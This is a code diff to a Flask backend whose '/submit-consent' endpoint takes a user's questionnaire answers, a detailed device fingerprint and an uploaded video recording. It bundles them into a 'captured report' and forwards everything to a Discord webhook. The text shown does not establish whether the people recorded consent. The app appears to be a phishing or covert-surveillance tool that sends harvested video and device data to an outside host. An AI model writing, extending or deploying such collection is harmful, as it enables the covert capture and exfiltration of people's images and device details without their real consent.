@@ -16,40 +16,37 @@ def home():
 
 @app.route("/submit-consent", methods=["POST"])
 def submit_consent():
-    username = request.form.get("username", "Utilisateur Anonyme")
-    
-    device_str = request.form.get("device", "{}")
     try:
-        device = json.loads(device_str)
-    except Exception:
-        device = {}
+        username = request.form.get("username", "Utilisateur Anonyme")
+        
+        device_str = request.form.get("device", "{}")
+        try:
+            device = json.loads(device_str)
+        except Exception:
+            device = {}
 
-    questions_summary = []
-    for i in range(1, 21):
-        val = request.form.get(f"q{i}", "N/A")
-        questions_summary.append(f"Q{i}: {val}")
-    
-    q_text = " | ".join(questions_summary[:5])
+        questions_summary = []
+        for i in range(1, 21):
+            val = request.form.get(f"q{i}", "N/A")
+            questions_summary.append(f"Q{i}: {val}")
+        
+        q_text = " | ".join(questions_summary[:5])
 
-    video_file = request.files.get("video")
+        video_file = request.files.get("video")
 
-    appareil = device.get('appareil', 'Appareil Inconnu')
-    systeme = device.get('systemeExploitation', 'Système Inconnu')
-    navigateur = device.get('navigateur', 'Inconnu')
-    langue = device.get('langueSysteme', 'Inconnue')
-    ram = device.get('memoireRAMApproximative', 'Non disponible')
-    cpu = device.get('processeurCœurs', 'Non disponible')
-    resolution = device.get('resolutionEcran', 'Non disponible')
-    batterie = device.get('niveauBatterie', 'Non disponible')
-    charge = device.get('etatCharge', 'Non disponible')
-    eco = device.get('modeEconomieEnergie', 'Non disponible')
-    orientation = device.get('orientationEcran', 'Non disponible')
-    tactile = device.get('pointsTactilesMax', 'Non disponible')
-    architecture = device.get('architectureCPU', 'Non disponible')
-    reseau = device.get('connexionReseau', 'Non disponible')
-    time_zone = device.get('fuseauHoraire', 'Non disponible')
+        appareil = device.get('appareil', 'Appareil Inconnu')
+        systeme = device.get('systemeExploitation', 'Système Inconnu')
+        navigateur = device.get('navigateur', 'Inconnu')
+        langue = device.get('langueSysteme', 'Inconnue')
+        ram = device.get('memoireRAMApproximative', 'Non disponible')
+        cpu = device.get('processeurCœurs', 'Non disponible')
+        resolution = device.get('resolutionEcran', 'Non disponible')
+        batterie = device.get('niveauBatterie', 'Non disponible')
+        charge = device.get('etatCharge', 'Non disponible')
+        reseau = device.get('connexionReseau', 'Non disponible')
+        time_zone = device.get('fuseauHoraire', 'Non disponible')
 
-    content_text = f"""✅ **Nouveau Rapport Capturé (Capture/Formulaire):**
+        content_text = f"""✅ **Nouveau Rapport Capturé (Capture/Formulaire):**
 • **Nom / Statut:** {username}
 • **Questions:** {q_text}
 • **Appareil:** {appareil}
@@ -57,39 +54,42 @@ def submit_consent():
 • **Navigateur:** {navigateur}
 • **Langue du système:** {langue}
 • **Niveau de Batterie:** {batterie} ({charge})
-• **Économie d'énergie:** {eco}
 • **Mémoire RAM:** {ram}
-• **Processeur (CPU):** {cpu} ({architecture})
-• **Résolution Écran:** {resolution} ({orientation})
-• **Points Tactiles:** {tactile}
+• **Processeur (CPU):** {cpu}
+• **Résolution Écran:** {resolution}
 • **Réseau:** {reseau}
 • **Fuseau Horaire:** {time_zone}"""
 
-    payload = {
-        "content": content_text
-    }
+        payload = {
+            "content": content_text
+        }
 
-    try:
         files = {}
         if video_file:
-            filename = video_file.filename or "recording.mp4"
+            filename = video_file.filename or "recording.webm"
             file_bytes = video_file.read()
-            content_type = "video/mp4" if filename.endswith(".mp4") else "video/webm"
+            content_type = video_file.content_type or "video/webm"
             
             files = {
                 "file": (filename, file_bytes, content_type)
             }
 
+        # إرسال الطلب لـ Discord مع timeout كافي
         resp = requests.post(
             DISCORD_WEBHOOK_URL, 
             data={"payload_json": json.dumps(payload)}, 
             files=files if files else None, 
-            timeout=30
+            timeout=45
         )
-        resp.raise_for_status()
+        
+        print(f"Discord Response Status: {resp.status_code}")
+        if resp.status_code >= 400:
+            print(f"Discord Error Response: {resp.text}")
 
         return jsonify({"message": "Success"}), 200
-    except requests.RequestException as e:
+
+    except Exception as e:
+        print(f"Error in submit_consent: {str(e)}")
         return jsonify({"error": str(e)}), 500
 
 if __name__ == "__main__":
